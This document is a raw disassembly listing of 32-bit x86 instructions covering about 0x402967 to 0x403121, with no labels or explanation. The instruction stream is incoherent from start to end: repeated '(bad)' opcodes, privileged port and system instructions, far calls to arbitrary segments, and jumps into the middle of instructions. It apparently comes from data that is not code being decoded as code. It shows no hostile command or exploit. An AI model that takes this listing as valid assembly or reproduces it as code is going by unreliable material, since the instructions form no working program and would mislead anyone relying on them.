  402967:	mov    ecx,0xc02cfa0c
  40296c:	add    BYTE PTR [ebx-0x729fdf22],bl
  402972:	push   0xffffffae
  402974:	enter  0x7152,0x5a
  402978:	mov    al,ds:0x8dd1d592
  40297d:	shl    BYTE PTR [ebp+0x39],1
  402980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402981:	leave  
  402982:	xchg   esi,eax
  402983:	call   0x7da8:0xd6895418
  40298a:	out    dx,al
  40298b:	push   cs
  40298c:	cmp    eax,0x88b6e315
  402991:	popa   
  402992:	(bad)  
  402993:	(bad)  
  402994:	xlat   BYTE PTR ds:[ebx]
  402995:	nop
  402996:	popa   
  402997:	xlat   BYTE PTR ds:[ebx]
  402998:	aas    
  402999:	sub    eax,0xb7970678
  40299e:	mov    ecx,0x8d69bfd1
  4029a3:	mov    ah,0xcd
  4029a5:	neg    dl
  4029a7:	pop    es
  4029a8:	mov    al,ds:0x35cde70c
  4029ad:	xor    al,0x9f
  4029af:	jmp    0x4654af13
  4029b4:	cwde   
  4029b5:	sbb    DWORD PTR [eax-0x59856c9c],0x5
  4029bc:	adc    ebp,ebp
  4029be:	mov    ecx,0xa92acd28
  4029c3:	jns    0x402a43
  4029c5:	push   esp
  4029c6:	mov    dh,0xde
  4029c8:	mov    ds,WORD PTR [edi+0x783fac39]
  4029ce:	jmp    0x35ab:0x4695ab78
  4029d5:	push   0x29d6e50c
  4029da:	sbb    BYTE PTR [eax],bh
  4029dc:	call   0x41ddfd1f
  4029e1:	sub    eax,edx
  4029e3:	push   ecx
  4029e4:	aaa    
  4029e5:	add    eax,0x2a7669e
  4029ea:	stc    
  4029eb:	mov    bh,0x6a
  4029ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029ee:	mov    dh,0xdd
  4029f0:	bound  ecx,QWORD PTR [eax+esi*8]
  4029f3:	mov    bl,0x4a
  4029f5:	mov    ds:0xe586bddb,al
  4029fa:	or     ebx,edi
  4029fc:	adc    al,0xa2
  4029fe:	fmulp  st(5),st
  402a00:	cmp    BYTE PTR [esi+ebp*2-0x25],0x61
  402a05:	pushf  
  402a06:	les    esi,FWORD PTR [esi-0x7b]
  402a09:	rcl    ebx,0x1a
  402a0c:	inc    esp
  402a0d:	sub    cl,BYTE PTR [ebp-0x22f28500]
  402a13:	sahf   
  402a14:	and    eax,0x7ccf3f4d
  402a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a1a:	push   0x11de0eb3
  402a1f:	inc    esp
  402a20:	sahf   
  402a21:	outs   dx,DWORD PTR ds:[esi]
  402a22:	ffreep st(0)
  402a24:	hlt    
  402a25:	cmp    eax,DWORD PTR [esi+esi*1+0x1ca30c11]
  402a2c:	mov    BYTE PTR ds:0x588c109,dl
  402a32:	jns    0x402a27
  402a34:	fldenv [esi-0x7e]
  402a37:	jmp    0x566012de
  402a3c:	int    0xf0
  402a3e:	jne    0x402a97
  402a40:	ficom  WORD PTR ds:0xdafa078f
  402a46:	and    ecx,DWORD PTR [edi-0x13f316b7]
  402a4c:	sbb    dl,ah
  402a4e:	push   es
  402a4f:	pop    esp
  402a50:	add    al,0x28
  402a52:	push   ebx
  402a53:	iret   
  402a54:	(bad)  
  402a55:	fwait
  402a56:	inc    esi
  402a57:	and    al,0x5a
  402a59:	clc    
  402a5a:	into   
  402a5b:	cmp    al,0xa
  402a5d:	sub    ah,BYTE PTR [eax+0x58238783]
  402a63:	call   0x5709:0xd1dccc1b
  402a6a:	push   edi
  402a6b:	add    BYTE PTR [edi+0x165471d0],0x72
  402a72:	dec    eax
  402a73:	mov    esp,0xea3179fa
  402a78:	cs loopne 0x402ab0
  402a7b:	jp     0x402aae
  402a7d:	jbe    0x402a92
  402a7f:	mov    bl,cl
  402a81:	pop    es
  402a82:	fwait
  402a83:	call   0x35d999d8
  402a88:	and    edx,DWORD PTR [eax]
  402a8a:	std    
  402a8b:	ja     0x402a2b
  402a8d:	stos   BYTE PTR es:[edi],al
  402a8e:	shr    BYTE PTR [ecx+0xfa701e2],0x94
  402a95:	in     eax,dx
  402a96:	in     eax,dx
  402a97:	xchg   edx,eax
  402a98:	ja     0x402aae
  402a9a:	mov    WORD PTR [ebx+esi*4+0x45141836],fs
  402aa1:	or     bh,BYTE PTR [eax]
  402aa3:	dec    edx
  402aa4:	rol    BYTE PTR [eax],0x4
  402aa7:	dec    ebp
  402aa8:	inc    ebp
  402aa9:	cmp    al,0x49
  402aab:	cmp    dh,BYTE PTR [esi-0xd456166]
  402ab1:	xchg   DWORD PTR [edi+edx*2],ebp
  402ab4:	xchg   edx,eax
  402ab5:	jns    0x402b17
  402ab7:	push   ss
  402ab8:	add    DWORD PTR [ecx-0x6f],0xb31b8cf7
  402abf:	or     DWORD PTR [esi-0x55],eax
  402ac2:	push   ss
  402ac3:	dec    ecx
  402ac4:	add    cl,BYTE PTR [edx-0x66]
  402ac7:	inc    esi
  402ac8:	inc    edx
  402ac9:	je     0x402a91
  402acb:	lahf   
  402acc:	lods   al,BYTE PTR ds:[esi]
  402acd:	aas    
  402ace:	loop   0x402ab8
  402ad0:	cld    
  402ad1:	lea    esi,[ecx+edx*2-0x7a]
  402ad5:	cmp    eax,0x3c08196d
  402ada:	mov    dh,BYTE PTR [eax]
  402adc:	dec    eax
  402add:	xor    al,0x3c
  402adf:	sbb    al,0x88
  402ae1:	push   0xffffff9d
  402ae3:	ins    DWORD PTR es:[edi],dx
  402ae4:	dec    eax
  402ae5:	daa    
  402ae6:	daa    
  402ae7:	stos   DWORD PTR es:[edi],eax
  402ae8:	icebp  
  402ae9:	jmp    0x402ab8
  402aeb:	sbb    ecx,DWORD PTR [ebx+0x73ffcef4]
  402af1:	test   ebx,ebp
  402af3:	int    0x3
  402af5:	jp     0x402ae9
  402af7:	jo     0x402a7e
  402af9:	test   DWORD PTR [ebx-0x77abc68e],ebx
  402aff:	jle    0x402ad6
  402b01:	dec    edx
  402b02:	adc    al,0xbb
  402b04:	clc    
  402b05:	ins    DWORD PTR es:[edi],dx
  402b06:	mov    bh,0x73
  402b08:	(bad)  
  402b09:	xor    DWORD PTR ds:0x4dfcf48d,esi
  402b0f:	sub    eax,0x91bef7ac
  402b14:	ror    ch,cl
  402b16:	iret   
  402b17:	dec    edx
  402b18:	add    eax,0x798a9548
  402b1d:	(bad)
  402b21:	mov    WORD PTR ds:0x81ef847a,?
  402b27:	mov    ah,0xcc
  402b29:	or     BYTE PTR [edi+0x24efa759],ah
  402b2f:	sbb    esp,edx
  402b31:	xor    al,0x59
  402b33:	dec    edx
  402b34:	sub    DWORD PTR [ebx-0x500f4b49],edi
  402b3a:	cmp    DWORD PTR [esi-0x38],ebx
  402b3d:	add    eax,0x65ce2efb
  402b42:	sub    eax,0x8337da68
  402b47:	mov    ss,esi
  402b49:	jno    0x402bb2
  402b4b:	adc    al,0x40
  402b4d:	inc    edx
  402b4e:	dec    edx
  402b4f:	jp     0x402b06
  402b51:	dec    edx
  402b52:	xchg   ebx,eax
  402b53:	inc    eax
  402b54:	xchg   esp,eax
  402b55:	aas    
  402b56:	neg    ah
  402b58:	push   ecx
  402b59:	stc    
  402b5a:	div    DWORD PTR [edi+0x1c65da3e]
  402b60:	jb     0x402b5f
  402b62:	add    BYTE PTR [ebx],cl
  402b64:	sub    al,0xec
  402b66:	ficom  WORD PTR [edx-0x54]
  402b69:	int    0x22
  402b6b:	mov    ecx,0x7dd2f7f7
  402b70:	loop   0x402bd2
  402b72:	push   edx
  402b73:	mov    edx,0xc332669
  402b78:	push   0x5e8c2b25
  402b7d:	inc    ebp
  402b7e:	inc    ecx
  402b7f:	lea    ebp,[edi+0x4e]
  402b82:	fild   WORD PTR [ecx-0x33]
  402b85:	cdq    
  402b86:	daa    
  402b87:	mov    bh,0x30
  402b89:	out    dx,al
  402b8a:	or     ch,BYTE PTR [ebx]
  402b8c:	jl     0x402ba1
  402b8e:	out    dx,al
  402b8f:	pop    es
  402b90:	push   esi
  402b91:	cmp    bh,BYTE PTR [edx]
  402b93:	pop    edi
  402b94:	pop    es
  402b95:	mov    ds:0xa7bce7f7,eax
  402b9a:	in     al,dx
  402b9b:	mov    BYTE PTR [ebp+0x23a62798],dh
  402ba1:	add    dl,dh
  402ba3:	pop    edx
  402ba4:	fnsave [edi-0x6ce2b64f]
  402baa:	hlt    
  402bab:	enter  0x2807,0x7c
  402baf:	jge    0x402b80
  402bb1:	and    al,0xa1
  402bb3:	mov    esp,0x9c8a8cd0
  402bb8:	in     eax,dx
  402bb9:	adc    al,0xf9
  402bbb:	cmp    DWORD PTR [edi+0x14],edi
  402bbe:	fcomp  DWORD PTR ds:0x52b49f8e
  402bc4:	dec    edi
  402bc5:	mov    bl,0x75
  402bc7:	push   esi
  402bc8:	lea    edi,[ecx-0x20]
  402bcb:	add    ebx,eax
  402bcd:	mov    ebx,0x889db284
  402bd2:	or     edx,DWORD PTR [ebp-0x30]
  402bd5:	xchg   BYTE PTR [esi-0x23c5ac0f],al
  402bdb:	mov    al,ds:0xa86953a3
  402be0:	shr    DWORD PTR [ecx+eiz*4-0x6],1
  402be4:	loopne 0x402b70
  402be6:	sbb    eax,0xeb2c285a
  402beb:	jg     0x402be2
  402bed:	xchg   DWORD PTR [ebx],edi
  402bef:	xor    al,0xa5
  402bf1:	retf   0xd7f2
  402bf4:	enter  0x69d3,0x2a
  402bf8:	sti    
  402bf9:	push   0xd03a963b
  402bfe:	js     0x402c34
  402c00:	leave  
  402c01:	out    dx,eax
  402c02:	adc    dl,BYTE PTR [esi]
  402c04:	outs   dx,DWORD PTR ds:[esi]
  402c05:	not    DWORD PTR [edi-0x600a4ce]
  402c0b:	pop    ecx
  402c0c:	sbb    edi,DWORD PTR [ebx-0x318234a1]
  402c12:	mov    WORD PTR [edi-0x6b8193b0],cs
  402c18:	pop    es
  402c19:	and    ah,BYTE PTR [eax]
  402c1b:	jmp    DWORD PTR [ecx]
  402c1d:	jle    0x402bbe
  402c1f:	addr16 gs ret 0x95f7
  402c24:	or     BYTE PTR [ebx-0x2f],bl
  402c27:	scas   al,BYTE PTR es:[edi]
  402c28:	cmp    BYTE PTR [edi],ah
  402c2a:	xchg   ebx,eax
  402c2b:	sbb    al,BYTE PTR [esi-0x43dcd4e4]
  402c31:	cmp    DWORD PTR ds:[ebp+0x60],esi
  402c35:	aas    
  402c36:	push   ds
  402c37:	sbb    al,0x9a
  402c39:	sbb    DWORD PTR [ebx],0x64
  402c3c:	retf   0x27c0
  402c3f:	icebp  
  402c40:	ret    0x5102
  402c43:	adc    cl,0xda
  402c46:	jo     0x402c99
  402c48:	icebp  
  402c49:	fdiv   DWORD PTR [edi+0x623f02dc]
  402c4f:	(bad)  
  402c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c52:	mov    ah,0xf7
  402c54:	pop    ecx
  402c55:	pop    eax
  402c56:	je     0x402c81
  402c58:	lock aas 
  402c5a:	inc    esp
  402c5b:	mov    eax,0xf21938cd
  402c60:	mov    bh,BYTE PTR [esi]
  402c62:	pop    esi
  402c63:	xchg   esp,eax
  402c64:	arpl   WORD PTR [edi+ecx*1+0x2c],cx
  402c68:	or     ah,BYTE PTR ds:0xbb6a3dea
  402c6e:	stos   DWORD PTR es:[edi],eax
  402c6f:	loope  0x402c73
  402c71:	jecxz  0x402ce5
  402c73:	fadd   st,st(5)
  402c75:	icebp  
  402c76:	adc    al,0x22
  402c78:	push   esi
  402c79:	or     dh,0xac
  402c7c:	loope  0x402ce9
  402c7e:	fst    st(7)
  402c80:	xchg   esp,eax
  402c81:	call   0x6b1f8d33
  402c86:	push   ecx
  402c87:	popf   
  402c88:	inc    edx
  402c89:	mov    ecx,0xf062aad5
  402c8e:	(bad)  
  402c8f:	push   ss
  402c90:	inc    esi
  402c91:	push   es
  402c92:	stos   BYTE PTR es:[edi],al
  402c93:	int3   
  402c94:	iretw  
  402c96:	push   edx
  402c97:	or     BYTE PTR [ecx+0xa],0xb6
  402c9b:	popf   
  402c9c:	and    esi,ebx
  402c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c9f:	jns    0x402cf5
  402ca1:	jge    0x402ced
  402ca3:	xchg   esp,eax
  402ca4:	push   ebx
  402ca5:	mov    DWORD PTR [ebx-0x43],0xb4d6ed30
  402cac:	add    BYTE PTR [edx+0x488ebabe],ah
  402cb2:	sbb    cl,BYTE PTR [ebx+ebp*8-0x53]
  402cb6:	cwde   
  402cb7:	or     eax,DWORD PTR [eax]
  402cb9:	pop    eax
  402cba:	jb     0x402c95
  402cbc:	cmp    cl,BYTE PTR [esp+eax*2]
  402cbf:	cmp    BYTE PTR [eax+edx*8+0xc],al
  402cc3:	shl    BYTE PTR [bx+di+0x1b5d],cl
  402cc8:	in     al,0xff
  402cca:	vmwrite ecx,DWORD PTR [esi+0x3428e646]
  402cd1:	mov    bl,0x59
  402cd3:	push   ss
  402cd4:	data16 stos WORD PTR es:[edi],ax
  402cd7:	xor    edx,DWORD PTR [eax+ebx*1]
  402cda:	lea    edx,[edi]
  402cdc:	scas   al,BYTE PTR es:[edi]
  402cdd:	xchg   edx,eax
  402cde:	or     DWORD PTR [ecx],esp
  402ce0:	pop    ecx
  402ce1:	mov    dh,0x36
  402ce3:	inc    ecx
  402ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ce5:	pop    ebx
  402ce6:	repnz pop esp
  402ce8:	jle    0x402d5f
  402cea:	sbb    eax,0xc283efc0
  402cef:	jecxz  0x402d24
  402cf1:	ss adc eax,0x1358403
  402cf7:	inc    ebp
  402cf8:	jmp    0x402d3b
  402cfa:	data16 lock loopne 0x402caf
  402cfe:	inc    esi
  402cff:	aad    0x82
  402d01:	or     BYTE PTR [edi-0x1c],ch
  402d04:	lahf   
  402d05:	adc    DWORD PTR [eax],edx
  402d07:	(bad)  
  402d08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d09:	jnp    0x402ce9
  402d0b:	pop    esi
  402d0c:	jne    0x402d6b
  402d0e:	repz loope 0x402d77
  402d11:	jmp    0x402caf
  402d13:	in     al,dx
  402d14:	inc    edi
  402d15:	inc    eax
  402d16:	scas   al,BYTE PTR es:[edi]
  402d17:	jecxz  0x402cce
  402d19:	xchg   DWORD PTR [esi+0x31],esp
  402d1c:	cs cmp al,0x22
  402d1f:	dec    edi
  402d20:	icebp  
  402d21:	xchg   ebx,eax
  402d22:	push   ds
  402d23:	and    eax,0x4c911159
  402d28:	or     cl,BYTE PTR [ecx+0x39]
  402d2b:	mov    bh,0xd9
  402d2d:	cmc    
  402d2e:	fs mov dl,0x9a
  402d31:	xchg   ebp,eax
  402d32:	loope  0x402d4f
  402d34:	xor    eax,0x901541f8
  402d39:	xor    esp,DWORD PTR [ebp-0x1bfa2e6]
  402d3f:	fistp  WORD PTR [ebx-0x2f5e6389]
  402d45:	ret    
  402d46:	outs   dx,BYTE PTR ds:[esi]
  402d47:	aas    
  402d48:	mov    dh,0x95
  402d4a:	pop    esi
  402d4b:	iret   
  402d4c:	out    0xb9,eax
  402d4e:	ins    BYTE PTR es:[edi],dx
  402d4f:	inc    sp
  402d51:	in     eax,dx
  402d52:	jo     0x402d4d
  402d54:	jno    0x402dd0
  402d56:	xchg   esi,eax
  402d57:	fcomp  QWORD PTR [eax-0x40087380]
  402d5d:	cwde   
  402d5e:	pusha  
  402d5f:	cld    
  402d60:	mov    DWORD PTR [eax+0x4f],edi
  402d63:	xchg   BYTE PTR [eax+0x202095bb],ah
  402d69:	dec    ebx
  402d6a:	xchg   esp,eax
  402d6b:	fidivr DWORD PTR [edi-0x7b]
  402d6e:	jecxz  0x402d39
  402d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d71:	js     0x402dcd
  402d73:	xlat   BYTE PTR ds:[ebx]
  402d74:	mov    al,ds:0x6581ad53
  402d79:	mov    BYTE PTR [esi+0x14b912ad],ah
  402d7f:	ja     0x402d80
  402d81:	popa   
  402d82:	jg     0x402d19
  402d84:	(bad)  
  402d85:	icebp  
  402d86:	sub    al,0xff
  402d88:	push   eax
  402d89:	inc    edi
  402d8a:	xchg   ebx,eax
  402d8b:	push   es
  402d8c:	xor    eax,0x7e6be0d7
  402d91:	cld    
  402d92:	xor    eax,0xfc587632
  402d97:	mov    ds:0xe3c2c2f3,eax
  402d9c:	and    al,0xdd
  402d9e:	push   0xffffffc2
  402da0:	mov    ds,WORD PTR [ebp+0x16eacfef]
  402da6:	stos   BYTE PTR es:[edi],al
  402da7:	rol    DWORD PTR [esi+0x75],cl
  402daa:	push   ecx
  402dab:	(bad)  
  402dac:	dec    esp
  402dad:	mov    al,ds:0x932c7e41
  402db2:	and    DWORD PTR ds:0x601fd54,edi
  402db8:	fcomp  st(6)
  402dba:	dec    edx
  402dbb:	mov    WORD PTR [esi],ds
  402dbd:	pop    es
  402dbe:	mov    eax,ds:0x2539493f
  402dc3:	or     eax,0x5daa7e00
  402dc8:	mov    BYTE PTR [ebx+edx*8+0x743c6c17],bl
  402dcf:	repz xor esi,DWORD PTR [edx-0x608de8c2]
  402dd6:	clc    
  402dd7:	adc    ch,bl
  402dd9:	out    0x29,eax
  402ddb:	(bad)  
  402ddc:	test   DWORD PTR [edx+0x53f3cd1],0x76b0079d
  402de6:	add    bh,BYTE PTR [ebx+0xbd148e0]
  402dec:	(bad)  
  402ded:	jne    0x402e0b
  402def:	dec    edx
  402df0:	(bad)  [ecx+0x2153f9a0]
  402df6:	sar    DWORD PTR [ecx],cl
  402df8:	out    dx,al
  402df9:	stos   BYTE PTR es:[edi],al
  402dfa:	popf   
  402dfb:	outs   dx,DWORD PTR ds:[esi]
  402dfc:	ror    eax,cl
  402dfe:	leave  
  402dff:	xchg   ebx,eax
  402e00:	stc    
  402e01:	clc    
  402e02:	push   edi
  402e03:	push   edx
  402e04:	mov    edi,0xa5f5ce11
  402e09:	ss jne 0x402e20
  402e0c:	(bad)  
  402e0d:	loope  0x402e64
  402e0f:	mov    cl,BYTE PTR [esp+edx*1-0x1d]
  402e13:	mov    ecx,ebx
  402e15:	and    DWORD PTR [ebx+0x5fb80fd3],0x6d9f0004
  402e1f:	addr16 iret 
  402e21:	in     eax,dx
  402e22:	(bad)  
  402e23:	dec    edi
  402e24:	(bad)  
  402e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e26:	and    bh,BYTE PTR ds:0xca31bb1b
  402e2c:	push   esi
  402e2d:	iret   
  402e2e:	sbb    cl,bl
  402e30:	test   al,0xe3
  402e32:	std    
  402e33:	icebp  
  402e34:	je     0x402de9
  402e36:	mov    al,0x33
  402e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e39:	cwde   
  402e3a:	sub    eax,edi
  402e3c:	push   es
  402e3d:	sub    BYTE PTR [eax],bh
  402e3f:	sub    al,0xa5
  402e41:	mov    ch,0x6a
  402e43:	rcr    ebx,1
  402e45:	psubsw mm5,QWORD PTR [edi]
  402e48:	push   0xffffffb5
  402e4a:	mov    esp,0x6d6b2a43
  402e4f:	nop
  402e50:	jns    0x402de2
  402e52:	push   0xffffffec
  402e54:	lea    ecx,[ebx+0x1d]
  402e57:	push   ebx
  402e58:	inc    ebx
  402e59:	mov    ebp,0xbbd74665
  402e5e:	sbb    eax,eax
  402e60:	xor    ebx,DWORD PTR [ebp+0x28]
  402e63:	ret    
  402e64:	add    al,0xe1
  402e66:	mov    ah,0xe1
  402e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e69:	or     eax,0x2d9d0e8
  402e6e:	or     dh,BYTE PTR [edx+0x44]
  402e71:	(bad)  
  402e72:	mov    dh,0xa
  402e74:	aaa    
  402e75:	adc    eax,0x15350073
  402e7a:	pop    eax
  402e7b:	fisubr DWORD PTR [eax+0x349287a6]
  402e81:	(bad)  
  402e82:	rol    cl,cl
  402e84:	repz pop ebp
  402e87:	out    0x5d,eax
  402e89:	mov    eax,0x512d7cd7
  402e8e:	mov    ds:0x45cf1cf0,al
  402e93:	(bad)  
  402e94:	sub    eax,0xe2312bee
  402e99:	jge    0x402e2b
  402e9b:	and    BYTE PTR [esi+esi*2+0x79],dl
  402e9f:	aad    0x9e
  402ea1:	sbb    esp,edi
  402ea3:	mov    esi,0x380f5ad2
  402ea8:	sbb    BYTE PTR [esi+0x50a5ddd4],0x4
  402eaf:	jecxz  0x402f1d
  402eb1:	mov    eax,0x997b2c51
  402eb6:	inc    edx
  402eb7:	fdiv   st(1),st
  402eb9:	call   FWORD PTR [ebx+0x17]
  402ebc:	test   eax,0x5e7fc9ee
  402ec1:	push   cs
  402ec2:	and    eax,0x7bc57429
  402ec7:	dec    ecx
  402ec8:	sar    DWORD PTR [esi-0xb],cl
  402ecb:	sub    BYTE PTR [eax-0x254e2abe],0xc1
  402ed2:	xor    eax,0xbe799c33
  402ed7:	and    DWORD PTR [esi],eax
  402ed9:	mov    DWORD PTR [ebx],ebp
  402edb:	imul   esp,DWORD PTR [edx+0x5f],0x45
  402edf:	push   esi
  402ee0:	sbb    bl,BYTE PTR [edx+eax*2]
  402ee3:	stos   DWORD PTR es:[edi],eax
  402ee4:	retf   
  402ee5:	mov    ds:0xd1e0c8f6,eax
  402eea:	inc    eax
  402eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402eec:	jo     0x402f26
  402eee:	daa    
  402eef:	push   es
  402ef0:	mov    ss,WORD PTR [ecx-0x683f1243]
  402ef6:	or     DWORD PTR cs:[eax+0x405ed7dc],0x56
  402efe:	mov    al,gs:0x98385849
  402f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f05:	loope  0x402eb8
  402f07:	adc    bl,BYTE PTR [ecx-0x63]
  402f0a:	arpl   WORD PTR [ebp+0x31],bp
  402f0d:	mov    al,ds:0xfa4cb08c
  402f12:	in     eax,dx
  402f13:	or     bh,ch
  402f15:	mov    WORD PTR [ecx-0x13],cs
  402f18:	out    dx,al
  402f19:	add    BYTE PTR [ebp-0x43],0xdb
  402f1d:	jle    0x402f91
  402f1f:	popa   
  402f20:	jno    0x402ea8
  402f22:	loopne 0x402fa0
  402f24:	(bad)  
  402f25:	(bad)  
  402f26:	xor    eax,eax
  402f28:	mul    BYTE PTR [edi]
  402f2a:	test   eax,0xfbb56181
  402f2f:	and    cl,BYTE PTR [edx+0x16f2fcbf]
  402f35:	fimul  WORD PTR [edx]
  402f37:	(bad)  
  402f38:	out    0xe0,al
  402f3a:	mov    edi,0x1dcdeeb7
  402f3f:	add    bh,BYTE PTR [eax]
  402f41:	pop    esp
  402f42:	outs   dx,DWORD PTR ds:[esi]
  402f43:	lds    esp,FWORD PTR [edi+0x73]
  402f46:	cmp    al,dl
  402f48:	adc    al,0x84
  402f4a:	dec    edx
  402f4b:	cs gs test al,0x49
  402f4f:	stos   BYTE PTR es:[edi],al
  402f50:	retf   
  402f51:	xchg   esi,edi
  402f53:	lds    ecx,FWORD PTR [ecx+0x1e]
  402f56:	hlt    
  402f57:	jecxz  0x402f5b
  402f59:	in     eax,dx
  402f5a:	and    BYTE PTR [edi],ah
  402f5c:	es out 0xe,eax
  402f5f:	into   
  402f60:	cmp    eax,0x15f57283
  402f65:	fs mov ch,0xf
  402f68:	je     0x402ef9
  402f6a:	lahf   
  402f6b:	cmp    DWORD PTR [esi-0x2f8d221c],0xf
  402f72:	add    eax,DWORD PTR ds:0xd30b3cef
  402f78:	enter  0xc27,0x6a
  402f7c:	pop    es
  402f7d:	sbb    DWORD PTR [ecx+0x59],esp
  402f80:	adc    DWORD PTR [ebx+0x45],0x890ddccf
  402f87:	push   0x1acfd887
  402f8c:	adc    edi,DWORD PTR [ecx+0x3d0d64bd]
  402f92:	jb     0x402f48
  402f94:	sub    eax,0xb8044218
  402f99:	cmp    esi,esp
  402f9b:	test   BYTE PTR [esi+0x7b],al
  402f9e:	hlt    
  402f9f:	sbb    BYTE PTR [edx+esi*8+0x4d25b431],dl
  402fa6:	sar    dh,cl
  402fa8:	adc    al,0xfd
  402faa:	inc    esp
  402fab:	add    al,cl
  402fad:	call   0x7706:0x9de4c8ae
  402fb4:	dec    edx
  402fb5:	cmc    
  402fb6:	fisubr DWORD PTR ds:0x9775d04d
  402fbc:	inc    ebx
  402fbd:	xor    BYTE PTR [edi],al
  402fbf:	xchg   edx,eax
  402fc0:	int    0x2b
  402fc2:	or     eax,0xfa75dd03
  402fc7:	imul   ecx,DWORD PTR [ecx+0x27fa3cf3],0x244fdbd3
  402fd1:	dec    esi
  402fd2:	and    eax,0x7a162096
  402fd7:	(bad)
  402fdb:	pop    eax
  402fdc:	out    0x93,eax
  402fde:	js     0x402fe4
  402fe0:	push   edi
  402fe1:	je     0x403046
  402fe3:	mov    al,ds:0xb9f7f578
  402fe8:	jae    0x402fed
  402fea:	push   ebx
  402feb:	retf   0x1348
  402fee:	(bad)
  402ff1:	ins    DWORD PTR es:[edi],dx
  402ff2:	gs jae 0x402fbb
  402ff5:	hlt    
  402ff6:	xor    ah,0xdf
  402ff9:	jmp    0x403011
  402ffb:	gs fwait
  402ffd:	enter  0x880f,0x95
  403001:	loope  0x402f99
  403003:	or     al,0x7a
  403005:	iret   
  403006:	lock sub ebp,edx
  403009:	pop    ebx
  40300a:	ret    0x8426
  40300d:	les    ecx,FWORD PTR [ebx]
  40300f:	test   bh,bh
  403011:	dec    eax
  403012:	imul   eax,DWORD PTR [eax],0xffffffe2
  403015:	outs   dx,BYTE PTR ds:[esi]
  403016:	cmp    esi,DWORD PTR [ecx+0x4c]
  403019:	pop    edx
  40301a:	fwait
  40301b:	rcr    DWORD PTR [edx],cl
  40301d:	inc    eax
  40301e:	mov    ds:0xd72d341,al
  403023:	adc    al,0x71
  403025:	lahf   
  403026:	popa   
  403027:	or     eax,0xd91ec597
  40302c:	xchg   ebp,eax
  40302d:	js     0x403004
  40302f:	shl    BYTE PTR ds:0xe1d36adb,0x9d
  403036:	push   edx
  403037:	mov    cs,WORD PTR [eax]
  403039:	cmp    al,0xff
  40303b:	aam    0xe3
  40303d:	sub    BYTE PTR [esi-0x75],0x4b
  403041:	jge    0x403077
  403043:	pop    ss
  403044:	pop    edi
  403045:	leave  
  403046:	call   0xe50342ae
  40304b:	mov    ds:0xa2c7ef08,al
  403050:	jg     0x403059
  403052:	push   ds
  403053:	ret    
  403054:	int3   
  403055:	xchg   esp,eax
  403056:	hlt    
  403057:	mov    edx,0xcb0c7a80
  40305c:	in     al,dx
  40305d:	adc    DWORD PTR [ecx+0x7f],esp
  403060:	bnd call 0x5cf653f2
  403066:	pop    edi
  403067:	shr    DWORD PTR [edx+edi*2],0xcf
  40306b:	push   esp
  40306c:	std    
  40306d:	sub    eax,0xd0c195da
  403072:	sbb    BYTE PTR ds:0xfad625f9,ch
  403078:	rcr    BYTE PTR [ebx],0xe7
  40307b:	xchg   BYTE PTR [ecx],dh
  40307d:	inc    eax
  40307e:	mov    eax,ds:0x342515fd
  403083:	or     BYTE PTR [eax+0x6d],0xdc
  403087:	aam    0x3
  403089:	adc    cl,al
  40308b:	adc    ch,ch
  40308d:	lods   eax,DWORD PTR ds:[esi]
  40308e:	xchg   ebp,eax
  40308f:	push   edi
  403090:	jecxz  0x4030dd
  403092:	adc    esp,ebx
  403094:	(bad)  
  403095:	aad    0x18
  403097:	out    0x7e,eax
  403099:	xlat   BYTE PTR ds:[ebx]
  40309a:	bound  ebp,QWORD PTR [edi+0x46b4f0d4]
  4030a0:	lods   eax,DWORD PTR ds:[esi]
  4030a1:	pushaw 
  4030a3:	xchg   esi,eax
  4030a4:	xchg   ebx,eax
  4030a5:	sub    eax,0xb9481614
  4030aa:	dec    esp
  4030ab:	popf   
  4030ac:	adc    DWORD PTR [ebx+0x70],ecx
  4030af:	pop    ecx
  4030b0:	rol    DWORD PTR [eax],1
  4030b2:	mov    ch,0x7c
  4030b4:	adc    BYTE PTR [esi],ch
  4030b6:	ret    
  4030b7:	inc    ebx
  4030b8:	int3   
  4030b9:	pop    edx
  4030ba:	mov    DWORD PTR [esi],esi
  4030bc:	lods   al,BYTE PTR ds:[esi]
  4030bd:	(bad)  
  4030be:	mov    ds:0xa049179c,eax
  4030c3:	call   0x3dd2:0x5aabf7a5
  4030ca:	jp     0x4030aa
  4030cc:	pop    eax
  4030cd:	dec    ecx
  4030ce:	(bad)  
  4030cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030d0:	fnstsw WORD PTR [ebx+0xa]
  4030d3:	arpl   bx,bp
  4030d5:	adc    eax,0x3d000b73
  4030da:	add    al,0x26
  4030dc:	retf   0x45e7
  4030df:	or     edx,DWORD PTR [ebx]
  4030e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030e2:	mov    bl,BYTE PTR [ebp+0x39]
  4030e5:	cmc    
  4030e6:	add    eax,0xfe8cf6c1
  4030eb:	add    bh,ch
  4030ed:	sbb    eax,0x8b799afb
  4030f2:	test   DWORD PTR [esi-0x7a],edx
  4030f5:	loop   0x4030f7
  4030f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030f8:	xchg   esp,eax
  4030f9:	sbb    eax,0xb3984472
  4030fe:	stos   BYTE PTR es:[edi],al
  4030ff:	int3   
  403100:	push   ds
  403101:	xor    eax,0x70dc435c
  403106:	outs   dx,DWORD PTR ds:[esi]
  403107:	cmp    ah,BYTE PTR [ebp-0x3fed7136]
  40310d:	mov    cl,0x9c
  40310f:	inc    ebp
  403110:	cmp    eax,0xa01e30cd
  403115:	pop    eax
  403116:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403118:	shr    ch,1
  40311a:	push   fs
  40311c:	or     eax,0x20281c8c
  403121:	mov    al,ds:0xce1456e1
